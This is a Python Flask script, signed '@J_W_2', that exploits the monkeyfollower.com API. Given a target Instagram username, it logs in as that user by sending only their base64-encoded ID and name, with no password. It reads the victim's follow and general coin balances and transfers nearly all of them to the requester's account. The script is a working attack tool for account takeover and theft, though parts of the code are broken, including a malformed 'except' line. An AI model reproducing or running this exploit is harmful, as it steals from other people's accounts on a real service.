import requests,instaloader,base64
from flask import *
api = Flask(__name__)
@api.route("/")
def cg():
 	
 	
 		my = request.args.get("yuser")
 		try:
 			pro = str(instaloader.Profile.from_username((instaloader.Instaloader()).context,my))
 			idd=str(pro.split(')>')[0])
 			myid=int(idd.split(' (')[1])
 		excepreturn {
 			"message": "Your User Error"
 			}
 	
 		llll = request.args.get("tuser")
 		try:
 			pro = str(instaloader.Profile.from_username((instaloader.Instaloader()).context,llll))
 			idd=str(pro.split(')>')[0])
 			iil=int(idd.split(' (')[1])
 		except:
 			return {
 			"message": "Target User Error"
 			}
 			
 		
 	
 		message2 = str(iil)
 		message_bytes2 = message2.encode('ascii')
 		base64_bytes2 = base64.b64encode(message_bytes2)
 		id= base64_bytes2.decode('ascii')
 		message2 = llll
 		message_bytes2 = message2.encode('ascii')
 		base64_bytes2 = base64.b64encode(message_bytes2)
 		usern= base64_bytes2.decode('ascii')

 		headers={
"Host": "monkeyfollower.com",
"content-type": "application/json; charset=UTF-8",
"user-agent": "okhttp/3.14.7"
}
 		data = {"android_id":"ff0ac4e2c7000bd1","version_code":2,"market_type":"bazzar","u_id": id, "u_name": usern}
 		m = requests.request('POST',"https://monkeyfollower.com/api/judy/loginUser",headers=headers,json=data).json()
 		token = m["token"]
 		headers={
"Host": "monkeyfollower.com",
"content-type": "application/json; charset=UTF-8",
"token": token,
"user-agent": "okhttp/3.14.7"
}
 		data = {"android_id":"ff0ac4e2c7000bd1","version_code":2,"market_type":"bazzar"}
 		m = requests.request('POST',"https://monkeyfollower.com/api/judy/getUserInfo",headers=headers,json=data).json()
 		follow_coin=m["user"]["follow_coin"]
 		general_coin=m["user"]["general_coin"]
 		
 		follow_coin=str(follow_coin)
 		if len(follow_coin)==2:
 			
 			k = str(follow_coin)
 			k=int(k[0])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-2)
 		elif len(follow_coin)==3:
 			k = str(follow_coin)
 			k=int(k[0]+k[1])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-34)
 		elif len(follow_coin)==4:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-34)
 		elif len(follow_coin)==5:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-34)
 		elif len(follow_coin)==6:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-34)
 		elif len(follow_coin)==7:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-37)
 		elif len(follow_coin)==8:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[6])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-50)
 		elif len(follow_coin)==9:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[7])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-99)
 		elif len(follow_coin)==10:
 			k = str(follow_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[6]+k[7]+k[8])
 			follow_coin=int(follow_coin)
 			follow_coin=int(follow_coin-k-1000) 	
 		general_coin=str(general_coin)
 		if len(general_coin)==2:
 			k = str(general_coin)
 			k=int(k[0])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-3)
 		elif len(general_coin)==3:
 			k = str(general_coin)
 			k=int(k[0]+k[1])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-24)
 		elif len(general_coin)==4:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-23)
 		elif len(general_coin)==5:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-34)
 		elif len(general_coin)==6:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-34)
 		elif len(general_coin)==7:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-32)
 		elif len(general_coin)==8:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[6])
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k-56)
 		elif len(general_coin)==9:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[7]-90)
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k)
 		elif len(general_coin)==10:
 			k = str(general_coin)
 			k=int(k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[6]+k[7]+k[8]-1000)
 			general_coin=int(general_coin)
 			general_coin=int(general_coin-k)		

 		data = {"android_id":"ff0ac4e2c7000bd1","version_code":2,"market_type":"bazzar","coin":follow_coin,"coin_type":"follow","target_id":myid}
 		k = requests.request('POST',"https://monkeyfollower.com/api/judy/transferCoin",headers=headers,json=data).json()
 		data = {"android_id":"ff0ac4e2c7000bd1","version_code":2,"market_type":"bazzar","coin":general_coin,"coin_type":"general","target_id":myid}
 		g = requests.request('POST',"https://monkeyfollower.com/api/judy/transferCoin",headers=headers,json=data).json()
 		follow_coin=int(follow_coin)
 		general_coin=int(general_coin)
 		if follow_coin >=50:
 			if general_coin>=50:
 				message="Successful Follow_Coin , Error General_Coin"
 			else:
 				message="Successful Follow_Coin , Error General_Coin"
 		else:
 			if general_coin>=50:
 				message="Error Follow_Coin , Successful General_Coin"
 			else:
 				message="Error Follow_Coin , Error General_Coin"	
 		
 		
 		
 		
 		return {
 		"BY": "@J_W_2",
 		"Follow_Coin": follow_coin,
 		"General_Coin": general_coin,
 		"message": message,
 		}
 		
 		

